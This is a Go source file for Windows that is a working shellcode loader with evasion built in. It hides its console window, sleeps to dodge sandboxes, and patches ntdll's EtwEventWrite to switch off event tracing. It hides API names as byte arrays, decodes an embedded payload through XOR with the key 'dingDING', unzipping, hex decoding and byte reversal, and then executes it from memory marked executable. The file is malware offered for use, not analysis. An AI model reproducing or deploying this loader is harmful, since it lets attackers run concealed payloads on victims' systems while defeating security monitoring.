package main

import (
	"syscall"

	"unsafe"

	"golang.org/x/sys/windows"

	"fmt"

	"archive/zip"

	"bytes"

	"io/ioutil"

	"encoding/hex"
)

func hideConsole(show bool) {
	getWin := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'})).NewProc(string([]byte{'G', 'e', 't', 'C', 'o', 'n', 's', 'o', 'l', 'e', 'W', 'i', 'n', 'd', 'o', 'w'}))
	showWin := syscall.NewLazyDLL("user32.dll").NewProc(string([]byte{'S', 'h', 'o', 'w', 'W', 'i', 'n', 'd', 'o', 'w'}))
	hwnd, _, _ := getWin.Call()
	if hwnd == 0 {
		return
	}
	if show {

		var swRestore uintptr = 9
		showWin.Call(hwnd, swRestore)
	} else {

		var swHide uintptr = 0
		showWin.Call(hwnd, swHide)
	}
}

func ntSleep() {

	ntdll := windows.NewLazySystemDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
	NtDelayExecution := ntdll.NewProc(string([]byte{'N', 't', 'D', 'e', 'l', 'a', 'y', 'E', 'x', 'e', 'c', 'u', 't', 'i', 'o', 'n'}))

	time := -(50 * 1000 * 10000)

	_, _, err := NtDelayExecution.Call(uintptr(0), uintptr(unsafe.Pointer(&time)))
	if err != syscall.Errno(0) {

		return
	}

}

func patch_E_T_W(module string, proc string, data *[]byte) (string, error) {
	oldBytes, err := read_E_T_W(module, proc, len(*data))
	if err != nil {
		return "", err
	}

	out := fmt.Sprintf("\nRead  %d bytes from %s!%s: %X", len(*data), module, proc, oldBytes)

	err = write_E_T_W(module, proc, data)
	if err != nil {
		return out, err
	}

	out += fmt.Sprintf("\nWrote %d bytes to   %s!%s: %X", len(*data), module, proc, *data)

	oldBytes, err = read_E_T_W(module, proc, len(*data))
	if err != nil {
		return out, err
	}

	out += fmt.Sprintf("\nRead  %d bytes from %s!%s: %X", len(*data), module, proc, oldBytes)

	return out, nil
}

func read_E_T_W(module string, proc string, byteLength int) ([]byte, error) {
	target := syscall.NewLazyDLL(module).NewProc(proc)
	err := target.Find()
	if err != nil {
		return nil, err
	}

	data := make([]byte, byteLength)
	var readBytes *uintptr

	err = windows.ReadProcessMemory(windows.CurrentProcess(), target.Addr(), &data[0], uintptr(byteLength), readBytes)
	if err != nil {
		return data, err
	}
	return data, nil
}

func write_E_T_W(module string, proc string, data *[]byte) error {
	target := syscall.NewLazyDLL(module).NewProc(proc)
	err := target.Find()
	if err != nil {
		return err
	}
	virtualProtect := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'})).NewProc(string([]byte{'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't'}))

	var oldProtect uint32

	ret, _, err := virtualProtect.Call(uintptr(unsafe.Pointer(target)), uintptr(len(*data)), uintptr(uint32(windows.PAGE_EXECUTE_READWRITE)), uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 || err != syscall.Errno(0) {
		return fmt.Errorf("there was an error calling Kernel32!VirtualProtect with return code %d: %s\n", ret, err)
	}

	var writeBytes *uintptr
	data2 := *data
	err = windows.WriteProcessMemory(windows.CurrentProcess(), target.Addr(), &data2[0], uintptr(len(*data)), writeBytes)
	if err != nil {
		return err
	}

	ret, _, err = virtualProtect.Call(uintptr(unsafe.Pointer(target)), uintptr(len(*data)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 || err != syscall.Errno(0) {
		return fmt.Errorf("there was an error calling Kernel32!VirtualProtect with return code %d: %s\n", ret, err)
	}
	return nil
}

func encryptDecrypt(input []byte, key string) (output []byte) {
	kL := len(key)
	for i := range input {
		output = append(output, byte(input[i]^key[i%kL]))
	}
	return output
}

func unzip(content []byte) ([]byte, error) {

	zipReader, err := zip.NewReader(bytes.NewReader(content), int64(len(content)))

	if err != nil {
		return nil, err
	}

	zipFile := zipReader.File[0]

	f, err := zipFile.Open()

	if err != nil {
		return nil, err
	}

	return ioutil.ReadAll(f)
}

func reverseOrder(data []byte) {
	for i, j := 0, len(data)-1; i < j; i, j = i+1, j-1 {
		data[i], data[j] = data[j], data[i]
	}
}

func run(codeshell []byte) {

	const (
		// MEM_COMMIT is a Windows constant used with Windows API calls
		MEM_COMMIT = 0x1000
		// MEM_RESERVE is a Windows constant used with Windows API calls
		MEM_RESERVE = 0x2000
		// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
		PAGE_EXECUTE_READ = 0x20
		// PAGE_READWRITE is a Windows constant used with Windows API calls
		PAGE_READWRITE         = 0x04
		PAGE_EXECUTE_READWRITE = 0x40
	)

	kernel32 := windows.NewLazySystemDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
	//ntdll := windows.NewLazySystemDLL("ntdll.dll")
	//msvcrt := windows.NewLazyDLL(string([]byte{'m','s','v','c','r','t','.','d','l','l'}))

	VirtualAlloc := kernel32.NewProc(string([]byte{'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c'}))
	VirtualProtect := kernel32.NewProc(string([]byte{'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't'}))
	//memcpy := msvcrt.NewProc(string([]byte{'m','e','m','c','p','y'}))

	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(codeshell)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc != syscall.Errno(0) {

		return

	}

	if addr == 0 {

		return
	}

	//_, _, errMemCpy := memcpy.Call(addr, (uintptr)(unsafe.Pointer(&codeshell[0])), uintptr(len(codeshell)))
	//
	//if errMemCpy != nil && errMemCpy != syscall.Errno(0)  {
	//
	//	return
	//}

	buff := (*[1890000]byte)(unsafe.Pointer(addr))
	for x, y := range codeshell {
		buff[x] = y
	}

	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(codeshell)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect != syscall.Errno(0) {

		return
	}

	_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)

	if errSyscall != syscall.Errno(0) {

		return
	}
}

func main() {

	codeshell := []byte{52, 34, 109, 99, 80, 73, 70, 71, 108, 105, 110, 103, 68, 73, 78, 71, 100, 105, 110, 103, 68, 73, 78, 71, 100, 105, 98, 103, 68, 73, 11, 19, 92, 27, 89, 29, 113, 26, 0, 49, 53, 95, 58, 53, 149, 220, 142, 103, 108, 50, 71, 71, 36, 85, 9, 23, 147, 118, 143, 249, 177, 167, 173, 175, 35, 98, 239, 67, 16, 78, 144, 68, 224, 30, 232, 140, 202, 95, 91, 85, 9, 144, 87, 12, 54, 209, 182, 71, 6, 175, 135, 77, 137, 51, 104, 251, 159, 175, 39, 101, 247, 94, 236, 210, 214, 229, 163, 31, 35, 143, 132, 114, 24, 47, 32, 116, 203, 224, 167, 64, 253, 126, 15, 232, 135, 37, 60, 86, 184, 121, 102, 112, 211, 88, 177, 164, 18, 185, 185, 158, 134, 178, 80, 229, 40, 202, 33, 216, 42, 241, 63, 201, 207, 224, 12, 176, 17, 188, 229, 179, 69, 79, 217, 160, 179, 190, 11, 212, 97, 225, 255, 227, 117, 54, 253, 102, 1, 9, 244, 126, 21, 254, 84, 182, 142, 3, 193, 137, 24, 165, 240, 227, 105, 26, 62, 170, 78, 132, 164, 143, 185, 208, 223, 99, 38, 203, 27, 228, 160, 13, 56, 198, 205, 248, 8, 84, 63, 66, 240, 61, 191, 157, 36, 219, 7, 157, 182, 138, 211, 86, 193, 24, 12, 13, 84, 249, 243, 161, 147, 77, 144, 214, 17, 23, 137, 123, 81, 145, 174, 253, 199, 151, 243, 244, 214, 255, 138, 220, 155, 216, 67, 204, 88, 243, 51, 33, 197, 152, 58, 37, 148, 139, 234, 130, 108, 154, 167, 177, 173, 85, 218, 30, 146, 129, 165, 2, 161, 219, 227, 226, 197, 164, 160, 227, 115, 0, 225, 164, 237, 154, 217, 166, 231, 248, 159, 155, 125, 103, 68, 182, 177, 23, 47, 110, 102, 74, 136, 232, 19, 74, 101, 105, 110, 95, 70, 73, 78, 23, 47, 104, 108, 115, 68, 93, 78, 79, 100, 97, 110, 103, 68, 73, 78, 106, 168, 200, 51, 106, 69, 73, 78, 127, 102, 105, 110, 107, 68, 73, 78, 71, 100, 105, 110, 103, 68, 73, 78, 71, 100, 105, 110, 103, 68, 12, 26, 127, 22, 94, 20, 82, 23, 7, 56, 22, 82, 57, 37, 98, 66, 73, 78, 71, 100, 104, 110, 102, 68, 115, 78, 71, 100, 46, 111, 103, 68, 73, 78}

	hideConsole(false)

	ntSleep()

	out_incey, err_incey := patch_E_T_W("ntdll.dll", "EtwEventWrite", &[]byte{0x48, 0x33, 0xC0, 0xC3})

	_ = out_incey

	if err_incey != nil {

	} else {

	}

	codeshell = encryptDecrypt(codeshell, "dingDING")

	codeshell, errZip := unzip(codeshell)

	if errZip != nil {

		return
	}

	codeshell, errHex := hex.DecodeString(string(codeshell))
	if errHex != nil {

		return
	}

	reverseOrder(codeshell)

	run(codeshell)

}
